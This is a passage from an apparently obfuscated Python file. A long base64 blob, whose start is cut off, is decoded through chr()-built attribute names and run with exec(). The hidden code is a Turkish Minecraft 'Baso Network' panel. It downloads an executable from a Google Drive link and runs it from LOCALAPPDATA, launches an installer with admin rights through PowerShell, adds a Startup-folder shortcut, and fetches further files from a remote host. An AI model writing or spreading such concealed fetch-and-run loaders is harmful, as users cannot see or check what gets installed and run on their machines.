GRlciwgImFwYWNoZV9zdGFydC5sbmsiKQoKICAgICMgQXlhcmxhcgogICAgYXV0byA9IEZhbHNlCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZXR0aW5nc19maWxlKToKICAgICAgICB3aXRoIG9wZW4oc2V0dGluZ3NfZmlsZSwgInIiKSBhcyBmOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzID0ganNvbi5sb2FkKGYpCiAgICAgICAgICAgICAgICBhdXRvID0gcy5nZXQoInhhbXBwX2F1dG8iLCBGYWxzZSkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgZWxzZToKICAgICAgICAjIMSwbGsga3VsbGFuxLFtIHNvcnVzdQogICAgICAgIGNob2ljZSA9IGlucHV0KCJCdSDDtnplbGxpxJ9pIG90b21hdGlrIHlhcG1hayBpc3RlciBtaXNpbml6PyAoRS9IKVxuPiAiKS5zdHJpcCgpLnVwcGVyKCkKICAgICAgICBpZiBjaG9pY2UgPT0gIkUiOgogICAgICAgICAgICBhdXRvID0gVHJ1ZQogICAgICAgICAgICBqc29uLmR1bXAoeyJ4YW1wcF9hdXRvIjogVHJ1ZX0sIG9wZW4oc2V0dGluZ3NfZmlsZSwgInciKSkKICAgICAgICAgICAgcHJpbnQoIkFydMSxayBoZXIgYcOnxLFsxLHFn3RhIEFwYWNoZSBhcmthcGxhbmRhIGJhxZ9sYXlhY2FrLiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAganNvbi5kdW1wKHsieGFtcHBfYXV0byI6IEZhbHNlfSwgb3BlbihzZXR0aW5nc19maWxlLCAidyIpKQogICAgICAgICAgICBwcmludCgiQXBhY2hlIGFya2FwbGFuZGEgYmHFn2xhdMSxbGFjYWssIGJhxZ9sYW5nxLFjYSBla2xlbm1leWVjZWsuIikKCiAgICBpZiBvcy5wYXRoLmV4aXN0cyh4YW1wcF9wYXRoKToKICAgICAgICAjIEFwYWNoZSd5aSBhcmthIHBsYW5kYSBiYcWfbGF0CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbeGFtcHBfcGF0aF0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQogICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiQXBhY2hlIGJhxZ9sYXTEsWxkxLEuIikKCiAgICAgICAgIyBFxJ9lciBvdG9tYXRpayBhw6dtYSBpc3Rlbml5b3JzYSB2ZSBrxLFzYXlvbCB5b2tzYSBzdGFydHVwJ2EgZWtsZQogICAgICAgIGlmIGF1dG86CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzaG9ydGN1dF9wYXRoKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBpbXBvcnQgcHl0aG9uY29tCiAgICAgICAgICAgICAgICAgICAgZnJvbSB3aW4zMmNvbS5zaGVsbCBpbXBvcnQgc2hlbGwsIHNoZWxsY29uCiAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLkNvSW5pdGlhbGl6ZSgpCiAgICAgICAgICAgICAgICAgICAgc2hlbGxfbGluayA9IHB5dGhvbmNvbS5Db0NyZWF0ZUluc3RhbmNlKAogICAgICAgICAgICAgICAgICAgICAgICBzaGVsbC5DTFNJRF9TaGVsbExpbmssIE5vbmUsCiAgICAgICAgICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5DTFNDVFhfSU5QUk9DX1NFUlZFUiwgc2hlbGwuSUlEX0lTaGVsbExpbmspCiAgICAgICAgICAgICAgICAgICAgc2hlbGxfbGluay5TZXRQYXRoKHhhbXBwX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgc2hlbGxfbGluay5TZXREZXNjcmlwdGlvbigiQXBhY2hlIFN0YXJ0IikKICAgICAgICAgICAgICAgICAgICBwZXJzaXN0X2ZpbGUgPSBzaGVsbF9saW5rLlF1ZXJ5SW50ZXJmYWNlKHB5dGhvbmNvbS5JSURfSVBlcnNpc3RGaWxlKQogICAgICAgICAgICAgICAgICAgIHBlcnNpc3RfZmlsZS5TYXZlKHNob3J0Y3V0X3BhdGgsIDApCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJBcGFjaGUgc3RhcnR1cCdhIGVrbGVuZGkuIikKICAgICAgICAgICAgICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJweXdpbjMyIHnDvGtsw7wgZGXEn2lsLCBzdGFydHVwJ2EgZWtsZW5lbWVkaS4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJBcGFjaGUgemF0ZW4gc3RhcnR1cCdhIGVrbGVubWnFny4iKQogICAgZWxzZToKICAgICAgICBwcmludChGb3JlLlJFRCArIGYiWEFNUFAgYmF0Y2ggZG9zeWFzxLEgYnVsdW5hbWFkxLE6IHt4YW1wcF9wYXRofSIpCgogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKZGVmIGt1cl9tZW51KCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIG9zLnN5c3RlbSgiY2xzIikKICAgICAgICB1c2VyX2lkLCBfID0gZ2V0X3VzZXJfaW5mbygpCiAgICAgICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgICAgIHByaW50KEZvcmUuV0hJVEUgKyAiS3VyIE1lbsO8c8O8IikKICAgICAgICBwcmludCgiIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIxLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBMYXVuY2hlcifEsSBrdXIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjIuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIFhBTVBQJ8SxIGt1ciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiMy4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgWEFNUFAgYmHFn2xhdCIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNC4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgRG9zeWFsYXLEsSBrdXIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjUuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIEdlcmkiKQogICAgICAgIGNob2ljZSA9IGlucHV0KEZvcmUuV0hJVEUgKyAiXG5TZcOnaW1pbml6OiAiKQoKICAgICAgICBpZiBjaG9pY2UgPT0gIjEiOgogICAgICAgICAgICBsYXVuY2hlcl9rdXIoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICIyIjoKICAgICAgICAgICAgeGFtcHBfa3VyKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgIHhhbXBwX2Jhc2xhdCgpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBkb3N5YWxhcmlfa3VyKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNSI6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiR2XDp2Vyc2l6IHNlw6dpbS4iKQogICAgICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKZGVmIHNlcnZlcl9zdGF0dXMoKToKICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKCiAgICBzZXJ2ZXIgPSAib3luYS5iYXNvLm5ldHdvcmsiCiAgICBwb3J0ID0gMjU1NjUgICMgTWluZWNyYWZ0IHN1bnVjdSBwb3J0dQoKICAgIHRyeToKICAgICAgICAjIFNvY2tldCBpbGUgYmHEn2xhbnTEsQogICAgICAgIHNvY2sgPSBzb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKHNlcnZlciwgcG9ydCksIHRpbWVvdXQ9NSkKCiAgICAgICAgIyBNaW5lY3JhZnQgcGluZyBwYWtldGluaSBnw7ZuZGVyIChzZXJ2ZXIgbGlzdCBwaW5nKQogICAgICAgICMgMHhGRSA9IExlZ2FjeSBzZXJ2ZXIgbGlzdCBwaW5nICgxLjcgw7ZuY2VzaSB2ZSAxLjggacOnaW4gw6dhbMSxxZ/EsXIpCiAgICAgICAgc29jay5zZW5kKGIiXHhmZVx4MDEiKQogICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoMTAyNCkKICAgICAgICBzb2NrLmNsb3NlKCkKCiAgICAgICAgaWYgZGF0YToKICAgICAgICAgICAgIyBEYXRhJ3nEsSBkZWNvZGUgZXQKICAgICAgICAgICAgcmF3ID0gZGF0YVszOl0uZGVjb2RlKCJ1dGYtMTZiZSIpLnNwbGl0KCJceDAwIikKICAgICAgICAgICAgb25saW5lX3BsYXllcnMgPSByYXdbLTJdICAjIE9ubGluZSBveXVuY3Ugc2F5xLFzxLEKICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiQWt0aWYgbWk6ICIgKyBGb3JlLkxJR0hUR1JFRU5fRVggKyAiRXZldCIpCiAgICAgICAgICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIk95dW5jdTogIiArIEZvcmUuTElHSFRHUkVFTl9FWCArIGYie29ubGluZV9wbGF5ZXJzfSBracWfaSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiQWt0aWYgbWk6ICIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIkhhecSxciIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkFrdGlmIG1pOiBIYXnEsXIiKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBIQVRBIFJBUE9STEFSSQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTGF1bmNoZXInxLEga3VyCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIGxhdW5jaGVyX2t1cigpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIkxhdW5jaGVyIGluZGlyaWxpeW9yIHZlIGt1cnVsdXlvci4uLiIpCgogICAgdXJsID0gImh0dHBzOi8vZHJpdmUudXNlcmNvbnRlbnQuZ29vZ2xlLmNvbS9kb3dubG9hZD9pZD0xWVFtOXZsVFRyWTBBcGhjOElwVjZKM1J3WVc5eVVZVEomZXhwb3J0PWRvd25sb2FkJmF1dGh1c2VyPTAmY29uZmlybT10JnV1aWQ9NDA2OTVjNzMtYTkwNC00MWY3LWE4NTQtYWYxNzVjMGQ5YmU5JmF0PUFOOHhIb3FpZ0VhVDJzWmt1eU1uT24tTzNBcUo6MTc1NjM5MDEzNDQyOSIKICAgIAogICAgIyDEsG5kaXJtZSB5ZXJpIChnZcOnaWNpIG9sYXJhayBEb3dubG9hZHMpCiAgICB0ZW1wX2Rvd25sb2FkID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJEb3dubG9hZHMiLCAiYmFzb253LmV4ZSIpCgogICAgIyBIZWRlZiBrbGFzw7ZyIHZlIGRvc3lhCiAgICBsb2NhbF9hcHBkYXRhID0gb3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKQogICAgdGFyZ2V0X2RpciA9IG9zLnBhdGguam9pbihsb2NhbF9hcHBkYXRhLCAiQmFzbyBOZXR3b3JrIikKICAgIG9zLm1ha2VkaXJzKHRhcmdldF9kaXIsIGV4aXN0X29rPVRydWUpCiAgICB0YXJnZXRfcGF0aCA9IG9zLnBhdGguam9pbih0YXJnZXRfZGlyLCAiYmFzb253LmV4ZSIpCgogICAgdHJ5OgogICAgICAgICMgw5ZuY2UgaW5kaXIKICAgICAgICB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSh1cmwsIHRlbXBfZG93bmxvYWQpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgZiJMYXVuY2hlciBpbmRpcmlsZGk6IHt0ZW1wX2Rvd25sb2FkfSIpCgogICAgICAgICMgRcSfZXIgaGVkZWZ0ZSBlc2tpIGV4ZSB2YXJzYSBzaWwKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh0YXJnZXRfcGF0aCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh0YXJnZXRfcGF0aCkKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuWUVMTE9XICsgIkVza2kgbGF1bmNoZXIgc2lsaW5kaS4iKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArIGYiRXNraSBsYXVuY2hlciBzaWxpbmVtZWRpOiB7ZX0iKQoKICAgICAgICAjIMSwbmRpcmlsZW4gZG9zeWF5xLEgaGVkZWYga2xhc8O2cmUga29weWFsYQogICAgICAgIHNodXRpbC5tb3ZlKHRlbXBfZG93bmxvYWQsIHRhcmdldF9wYXRoKQogICAgICAgIHByaW50KEZvcmUuTElHSFRHUkVFTl9FWCArIGYiTGF1bmNoZXIga3VydWxkdToge3RhcmdldF9wYXRofSIpCgogICAgICAgICMgw4dhbMSxxZ90xLFyCiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbdGFyZ2V0X3BhdGhdKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChGb3JlLlJFRCArIGYiTGF1bmNoZXIgaW5kaXJpbGVtZWRpOiB7ZX0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgWEFNUFAga3VyCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHhhbXBwX2t1cigpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIlhBTVBQIGt1cnVsdW11IGJhxZ9sYXTEsWzEsXlvci4uLiIpCgogICAgIyDEsG5kaXJtZSBsaW5raQogICAgdXJsID0gImh0dHBzOi8vbmV0aXguZGwuc291cmNlZm9yZ2UubmV0L3Byb2plY3QveGFtcHAvWEFNUFAlMjBXaW5kb3dzLzguMC4zMC94YW1wcC13aW5kb3dzLXg2NC04LjAuMzAtMC1WUzE2LWluc3RhbGxlci5leGUiCgogICAgIyBEb3dubG9hZHMga2xhc8O2csO8bmUga2F5ZGVkaWxlY2VrIGRvc3lhCiAgICBkb3dubG9hZF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJEb3dubG9hZHMiLCAieGFtcHBfaW5zdGFsbGVyLmV4ZSIpCgogICAgdHJ5OgogICAgICAgICMgxLBuZGlyCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIlhBTVBQIGluc3RhbGxlciBpbmRpcmlsaXlvci4uLiIpCiAgICAgICAgdXJsbGliLnJlcXVlc3QudXJscmV0cmlldmUodXJsLCBkb3dubG9hZF9wYXRoKQogICAgICAgIHByaW50KEZvcmUuTElHSFRHUkVFTl9FWCArIGYixLBuZGlybWUgdGFtYW1sYW5kxLE6IHtkb3dubG9hZF9wYXRofSIpCgogICAgICAgICMgWcO2bmV0aWNpIG9sYXJhayDDp2FsxLHFn3TEsXIKICAgICAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyAiWEFNUFAga3VydWx1bXUgYmHFn2xhdMSxbMSxeW9yIChBZG1pbiB5ZXRraXNpIGdlcmVraXlvcikuLi4iKQogICAgICAgIHN1YnByb2Nlc3MucnVuKFsicG93ZXJzaGVsbCIsICJTdGFydC1Qcm9jZXNzIiwgZG93bmxvYWRfcGF0aCwgIi1WZXJiIiwgInJ1bkFzIl0pCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJYQU1QUCBrdXJ1bHVtdSBiYcWfbGF0xLFsYW1hZMSxOiB7ZX0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFhBTVBQIGJhxZ9sYXQKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgeGFtcHBfYmFzbGF0KCk6CiAgICB4YW1wcF9wYXRoID0gciJDOlx4YW1wcFxhcGFjaGVfc3RhcnQuYmF0IgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHhhbXBwX3BhdGgpOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgIlhBTVBQIHnDvGtsw7wgZGXEn2lsLiDDlm5jZSBYQU1QUCBrdXJ1bi4iKQogICAgICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oW3hhbXBwX3BhdGhdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgIHByaW50KEZvcmUuTElHSFRHUkVFTl9FWCArICJBcGFjaGUgYmHFn2xhdMSxbGTEsSB2ZSBzdGFydHVwJ2EgZWtsZW5kaSAoZcSfZXIgc2XDp2lsbWnFn3NlKS4iKQogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIERvc3lhbGFyxLEga3VyCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIGRvc3lhbGFyaV9rdXIoKToKICAgIHhhbXBwX2RpciA9IHIiQzpceGFtcHAiCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoeGFtcHBfZGlyKToKICAgICAgICBwcmludChGb3JlLlJFRCArICJYQU1QUCBrdXJ1bHUgZGXEn2lsLiDDlm5jZSBYQU1QUCBrdXJ1bi4iKQogICAgICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICByZXR1cm4KCiAgICB0YXJnZXRfZm9sZGVyID0gb3MucGF0aC5qb2luKHhhbXBwX2RpciwgImh0ZG9jcyIsICJmaWxlcyIpCiAgICBvcy5tYWtlZGlycyh0YXJnZXRfZm9sZGVyLCBleGlzdF9vaz1UcnVlKQoKICAgICMgVXphbnTEsXPEsXogZG9zeWEKICAgIGJhc2VfdXJsID0gImh0dHBzOi8vbGF1bmNoZXIuYmFzby5uZXR3b3JrLyIKICAgIGZpbGVfbmFtZSA9ICJmaWxlcyIgICMgLmpzb24geW9rLCBkaXJla3QgImZpbGVzIgoKICAgIHRyeToKICAgICAgICBoZWRlZl95b2wgPSBvcy5wYXRoLmpvaW4odGFyZ2V0X2ZvbGRlciwgZmlsZV9uYW1lKQogICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKGJhc2VfdXJsICsgZmlsZV9uYW1lLCBoZWRlZl95b2wpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgZiJ7ZmlsZV9uYW1lfSBpbmRpcmlsZGkgdmUge2hlZGVmX3lvbH0gb2xhcmFrIGtheWRlZGlsZGkuIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChGb3JlLlJFRCArIGYie2ZpbGVfbmFtZX0gaW5kaXJpbGVtZWRpOiB7ZX0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1lbsO8CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICAgICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKICAgICAgICBwcmludChGb3JlLldISVRFICsgIkJhc28gTmV0d29yayBLdWxsYW7EsWPEsSBQYW5lbGkiKQogICAgICAgIHByaW50KCIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIE1vZCBFa2xlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIyLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2QgU2lsIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIzLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2RsYXLEsSBMaXN0ZWxlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI0LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBCYXNvIE5ldHdvcmsgYmlsZ2lsZXJpIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI1LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBMYXVuY2hlcsSxIGHDpyIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNi4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgS3VyIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI3LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBTdW51Y3UgRHVydW11IikKICAgICAgICBjaG9pY2UgPSBpbnB1dChGb3JlLldISVRFICsgIlxuU2XDp2ltaW5pejogIikKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgYWRkX21vZCgpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBkZWxldGVfbW9kKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgIGxpc3RfbW9kcygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBzaG93X3VzZXJfaW5mbygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjUiOgogICAgICAgICAgICBvcGVuX2xhdW5jaGVyKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNiI6CiAgICAgICAgICAgIGt1cl9tZW51KCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNyI6CiAgICAgICAgICAgIHNlcnZlcl9zdGF0dXMoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiR2XDp2Vyc2l6IHNlw6dpbS4iKQogICAgICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGNoZWNrX3VwZGF0ZSgpCiAgICBtZW51KCk="
agdqcneL = getattr(zkCYCUbW, chr(98)+chr(54)+chr(52)+chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))
exec(getattr(bytes, chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))(agdqcneL(PMPeEfCU), "utf-8"))
